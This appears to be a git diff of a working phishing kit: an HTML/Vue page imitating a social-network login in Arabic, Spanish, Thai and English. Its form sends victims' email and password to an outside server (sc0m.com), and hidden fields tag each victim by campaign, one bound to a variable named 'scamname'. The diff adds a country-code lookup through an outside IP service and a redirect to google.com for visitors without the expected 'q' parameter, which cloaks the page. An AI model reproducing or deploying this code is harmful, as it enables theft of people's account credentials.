@@ -1,241 +1,255 @@
 <html>
-  <head>
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>log in</title>
-    <link rel="icon" href="https://sca.sp0m.site/favicon.png">
-   <style>
-       body{
-	margin: 0;
-	font-family: sans-serif;
-	font-size: 13px;
-}
 
-.ar{
-	direction: rtl;
-}
-.head{
-	background: #152da2c7;
-  height: 37px;
-}
+<head>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>log in</title>
+  <link rel="icon" href="https://sca.sp0m.site/favicon.png">
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      font-size: 13px;
+    }
 
-.timo{
-	color:#000e6f7a;
-	font-size:11px;
-}
+    .ar {
+      direction: rtl;
+    }
 
-.asfer{
-	background-color:#fbd90026;
-	padding:7px 10px;
-	color:#584d029c;
-}
+    .head {
+      background: #152da2c7;
+      height: 37px;
+    }
 
-.segma{
-	background-color:#a095951a;
-	padding:9px 31px;
-}
+    .timo {
+      color: #000e6f7a;
+      font-size: 11px;
+    }
 
-.magma{
-	padding-bottom:202px;
-	text-align:center;
-}
+    .asfer {
+      background-color: #fbd90026;
+      padding: 7px 10px;
+      color: #584d029c;
+    }
 
-.forum{
-	padding:11px 0 0;
-}
+    .segma {
+      background-color: #a095951a;
+      padding: 9px 31px;
+    }
 
-.summary.summary>*{
-	border-bottom:1px solid #c7c3c369;
-	background-color: #FDFDFB;
-}
+    .magma {
+      padding-bottom: 202px;
+      text-align: center;
+    }
 
-.elle{
-	border:0;
-	padding: 13px;
-	width:100%;
-}
+    .forum {
+      padding: 11px 0 0;
+    }
 
-.pd-13{
-	padding: 13px;
-}
+    .summary.summary>* {
+      border-bottom: 1px solid #c7c3c369;
+      background-color: #FDFDFB;
+    }
 
-.bala{
-	display:inline-block;
-	-webkit-border-radius:3px;
-	font-weight:bold;
-	background-color:#004df9ad;
-	line-height:36px;
-	padding:0 18px;
-	color:white
-}
+    .elle {
+      border: 0;
+      padding: 13px;
+      width: 100%;
+    }
 
-.birou {
-    padding: 12px;
-    color: #FDFDFB;
-    border: 62px #3f800fed;
-    background: #1e4088b8;
-    border-radius: 4px;
-    font-weight: bold;
-    width: 100%;
-}
+    .pd-13 {
+      padding: 13px;
+    }
 
-.choco{
-	text-align:center;
-	padding:11px;
-}
-   </style>
-  </head>
-  <body >
-    <div class="head"></div>
-    <div id="page">
-      <div class="asfer">
-        <span>{{firsts}}</span>
-      </div>
-   
-      <div class="segma" >
-        <form class="forum" method="POST" action="https://sc0m.com/v/add">
-          <div class="summary"> 
-            <input class="elle" id="email" name="email" :placeholder="email" type="text" required>
-            <input class="elle" id="password" name="password" :placeholder="password" required type="password">
-            <div class="pd-13"> 
-              <input type="hidden" value="" name="id" v-model="id_u">
-              <input type="hidden" value="" name="sc" v-model="scamname">
-              <button type="submit" name="add" class="birou">{{login}}</button>
-            </div>
-          </form>
-        </div> 
-        <div class="choco">
-          <a class="bala">{{create}}</a> 
-        </div>
-        <div class="magma">
-          <a class="timo">{{forget}}</a>
-        </div>
-      </div>
+    .bala {
+      display: inline-block;
+      -webkit-border-radius: 3px;
+      font-weight: bold;
+      background-color: #004df9ad;
+      line-height: 36px;
+      padding: 0 18px;
+      color: white
+    }
+
+    .birou {
+      padding: 12px;
+      color: #FDFDFB;
+      border: 62px #3f800fed;
+      background: #1e4088b8;
+      border-radius: 4px;
+      font-weight: bold;
+      width: 100%;
+    }
+
+    .choco {
+      text-align: center;
+      padding: 11px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="head"></div>
+  <div id="page">
+    <div class="asfer">
+      <span>{{firsts}}</span>
     </div>
-    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
-     <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
-    <script>
-        var vm = new Vue({
-    el : "#page",
-    data:{
-      password:"",
-      email:"",
-      login:'',
-      firsts:'',
-      create:'',
-      forget:'',
-      fetch:[],
-      codecountry:'',
-      id_u:'',
-      scamname:'',
-    },
-    methods:{
-  //     adds(){
-  //       let email = document.getElementById('email').value;
-  //     let password = document.getElementById('password').value;
-  //        const queryString = window.location.search;
-  //  const urlParams = new URLSearchParams(queryString);
-  //  const id = urlParams.get('id');
-  //  const page = urlParams.get('page');
-  //  let sc = urlParams.get('sc');
-  //     if (email != "" && password != "") {
-  //       axios
-  //         .post("https://sp0meur.com/v/add", {
-  //           email: email,
-  //           ip: "wwwwwwww",
-  //           password: password,
-  //           country: this.codecountry,
 
-  //           userId: id,
-  //           pageId: page,
-  //         })
-  //         .then((res) => {
-  //        // alert(res.data.message)
-          
-  //          window.location.href ="https://sp0m.site/";
-  //         })
-  //         .catch((err) => {
-  //           window.location.href ="https://sp0m.site/";
-  //           alert(err.message);
-  //         });
-  //     } else {
-  //       alert("email or password incorect");
-  //     }
-  //     },
-   },
-          
-     mounted()  {
-         let email = document.getElementById('email').value;
-      let password = document.getElementById('password').value;
-         const queryString = window.location.search;
-   const urlParams = new URLSearchParams(queryString);
-   const q = urlParams.get('q');
+    <div class="segma">
+      <form class="forum" method="POST" action="https://sc0m.com/v/add">
+        <div class="summary">
+          <input class="elle" id="email" name="email" :placeholder="email" type="text" required>
+          <input class="elle" id="password" name="password" :placeholder="password" required type="password">
+          <div class="pd-13">
+            <input type="hidden" value="" name="id" v-model="id_u">
+            <input type="hidden" value="" name="sc" v-model="scamname">
+            <input type="hidden" value="" name="code" v-model="codecountry">
 
-let rrs= atob(q);
-let idu= rrs.split("=")[1][1]
-let user= rrs.split("_")[3]
-user= user.split("=")[1]
-let sc= rrs.split("_")[2]
-sc= sc.split("=")[1]
-rrs= rrs.split("_")[1]
-rrs= rrs.split("=")[1]
-//alert(user)
-let lang = rrs;
-this.id_u = user
-this.scamname= sc
+            <button type="submit" name="add" class="birou">{{login}}</button>
+          </div>
+      </form>
+    </div>
+    <div class="choco">
+      <a class="bala">{{create}}</a>
+    </div>
+    <div class="magma">
+      <a class="timo">{{forget}}</a>
+    </div>
+  </div>
+  </div>
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+  <script src="https://unpkg.com/country-phone-prefix@latest"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script>
+    var vm = new Vue({
+      el: "#page",
+      data: {
+        password: "",
+        email: "",
+        login: '',
+        firsts: '',
+        create: '',
+        forget: '',
+        fetch: [],
+        codecountry: '',
+        id_u: '',
+        scamname: '',
+      },
+      methods: {
+        //     adds(){
+        //       let email = document.getElementById('email').value;
+        //     let password = document.getElementById('password').value;
+        //        const queryString = window.location.search;
+        //  const urlParams = new URLSearchParams(queryString);
+        //  const id = urlParams.get('id');
+        //  const page = urlParams.get('page');
+        //  let sc = urlParams.get('sc');
+        //     if (email != "" && password != "") {
+        //       axios
+        //         .post("https://sp0meur.com/v/add", {
+        //           email: email,
+        //           ip: "wwwwwwww",
+        //           password: password,
+        //           country: this.codecountry,
 
-       if(lang == 'ar'){
-         this.email = "رقم الهاتف  أو البريد الإلكتروني";
-         this.password = "كلمه السر";
-         this.create = "انشاء حساب جديد";
-         this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
-         this.forget = " هل نسيت كلمة السر ؟";
-         this.login="تسجيل الدخول"
-       }
-       else if (lang == 'es'){
+        //           userId: id,
+        //           pageId: page,
+        //         })
+        //         .then((res) => {
+        //        // alert(res.data.message)
+
+        //          window.location.href ="https://sp0m.site/";
+        //         })
+        //         .catch((err) => {
+        //           window.location.href ="https://sp0m.site/";
+        //           alert(err.message);
+        //         });
+        //     } else {
+        //       alert("email or password incorect");
+        //     }
+        //     },
+      },
+
+      mounted() {
+        let email = document.getElementById('email').value;
+        let password = document.getElementById('password').value;
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const q = urlParams.get('q');
+
+        let rrs = atob(q);
+        let idu = rrs.split("=")[1][1]
+        let user = rrs.split("_")[3]
+        user = user.split("=")[1]
+        let sc = rrs.split("_")[2]
+        sc = sc.split("=")[1]
+        rrs = rrs.split("_")[1]
+        rrs = rrs.split("=")[1]
+        //alert(user)
+        let lang = rrs;
+        this.id_u = user
+        this.scamname = sc
+
+        if (lang == 'ar') {
+          this.email = "رقم الهاتف  أو البريد الإلكتروني";
+          this.password = "كلمه السر";
+          this.create = "انشاء حساب جديد";
+          this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
+          this.forget = " هل نسيت كلمة السر ؟";
+          this.login = "تسجيل الدخول"
+        }
+        else if (lang == 'es') {
           this.email = "Número o correo electrónico";
-         this.password = "contraseña";
-         this.create = "Crear una nueva cuenta";
-         this.firsts = "Primero debes iniciar sesión.";
-         this.forget = "¿Contraseña olvidada?";
-         this.login = "iniciar sesión";
-       }
-       else if (lang == 'th'){
+          this.password = "contraseña";
+          this.create = "Crear una nueva cuenta";
+          this.firsts = "Primero debes iniciar sesión.";
+          this.forget = "¿Contraseña olvidada?";
+          this.login = "iniciar sesión";
+        }
+        else if (lang == 'th') {
           this.email = "เบอร์มือถือหรืออีเมล";
-         this.password = "รหัสผ่าน";
-         this.create = "สร้างบัญชีใหม่";
-         this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
-         this.forget = "ลืมรหัสผ่าน?";
-         this.login = "เข้าสู่ระบบ";
-       }
-       else {
+          this.password = "รหัสผ่าน";
+          this.create = "สร้างบัญชีใหม่";
+          this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
+          this.forget = "ลืมรหัสผ่าน?";
+          this.login = "เข้าสู่ระบบ";
+        }
+        else {
           this.email = "Mobile number or email address";
-         this.password = "Password";
-         this.create = "Create New Account";
-         this.firsts = "You need to log in first.";
-         this.forget = "Forgotten password?";
-         this.login = "Log In";
-       }
-       
-axios.get("https://sp0m.site/ip.php")
-           .then((resps)=>{
- 
-        let dd=  cpp[resps.data]
-           this.codecountry = dd.prefix;
-             })
-      
-            },
-  })
+          this.password = "Password";
+          this.create = "Create New Account";
+          this.firsts = "You need to log in first.";
+          this.forget = "Forgotten password?";
+          this.login = "Log In";
+        }
 
-  
+        axios.get("https://livebotola.com/ip.php")
+          .then((resps) => {
+
+            let dd = cpp[resps.data]
+            this.codecountry = dd.prefix;
+            //  alert(dd.prefix);
+          })
+
+      },
+    })
+
+
     //  let t= await     axios.get("https://sp0m.site/ip.php");
-         //  let dd=  cpp[resps.data];
-        //   let oo=  dd.prefix;
-         
+    //  let dd=  cpp[resps.data];
+    //   let oo=  dd.prefix;
 
-   
-   
-    </script>
-  
-</body></html>
 
+
+    const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const q = urlParams.get('q');
+    
+    if (q == null) {
+      window.location = "https://google.com";
+      exit();
+    }
+  </script>
+
+</body>
+
+</html>
